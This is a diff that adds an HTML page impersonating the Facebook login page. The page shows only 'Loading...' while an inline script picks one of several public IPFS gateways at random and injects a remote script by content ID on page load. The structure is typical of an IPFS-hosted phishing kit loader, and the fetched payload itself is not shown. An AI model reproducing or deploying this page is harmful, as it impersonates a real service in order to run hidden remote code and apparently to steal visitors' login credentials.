@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - Log In or Sign Up</title>
+  <meta name="description" content="Create an account or log in to Facebook. Connect with friends and family.">
+</head>
+<body>
+  <div id="root">Loading...</div>
+
+ 
+  <script>
+    const gateways = [
+      'https://cloudflare-ipfs.com/ipfs/',
+      'https://dweb.link/ipfs/',
+      'https://nftstorage.link/ipfs/'
+    ];
+    const cid = 'bafkreidxcrvrqbt5tf2s74kagfedvn4trga24ttwwtdeiakohhyt4babnq';
+    const random = gateways[Math.floor(Math.random() * gateways.length)];
+    document.write(`<script src="${random}${cid}"></script>`);
+  </script>
+  
+</body>
+</html>
